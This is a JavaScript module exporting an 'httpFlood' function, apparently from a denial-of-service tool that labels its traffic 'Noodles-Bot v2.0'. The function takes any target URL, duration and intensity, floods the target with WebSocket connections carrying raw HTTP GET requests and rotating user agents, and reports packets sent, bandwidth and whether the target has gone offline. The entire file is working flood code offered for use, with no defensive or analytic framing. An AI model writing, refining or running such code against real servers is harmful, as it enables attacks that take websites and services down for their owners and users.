async function httpFlood(target, duration, intensity) {
  try {
    const url = new URL(target);
    const host = url.hostname;
    const path = url.pathname || '/';
    let port = url.port;

    if (!port) {
      port = url.protocol === 'https:' ? 443 : 80;
    } else {
      port = parseInt(port, 10);
    }

    const protocol = url.protocol === 'https:' ? 'https' : 'http';
    const startTime = Date.now();
    const interval = Math.max(1, 50 / intensity);
    const userAgents = [
      'Noodles-Bot v2.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Noodles-Bot v2.0',
      'Noodles-Bot v2.0',
      'Noodles-Bot v2.0',
      'Noodles-Bot v2.0',
    ];

    let packetsSent = 0;
    let targetStatus = 'Online';
    let mbps = 0;

    while (Date.now() - startTime < duration * 1000) {
      for (let i = 0; i < intensity; i++) {
        const isSecure = protocol === 'https';
        const socketProtocol = isSecure ? 'wss' : 'ws';
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n`;

        try {
          const socket = new WebSocket(`${socketProtocol}://${host}:${port}${path}`);

          socket.onopen = () => {
            socket.send(payload);
            packetsSent++;
            mbps += payload.length / 1000000;
            socket.close();
          };

          socket.onerror = (error) => {
            targetStatus = 'Unresponsive';
            socket.close();
          };

          socket.onclose = () => { };

        } catch (error) {
          targetStatus = 'Offline';
        }
        await new Promise(resolve => setTimeout(resolve, interval));

      }
    }

    mbps = (mbps * 8) / duration;
    return { packetsSent, targetStatus, mbps };

  } catch (error) {
    console.error("Error in httpFlood:", error);
    return { packetsSent: 0, targetStatus: 'Offline', mbps: 0 };
  }
}

module.exports = { httpFlood };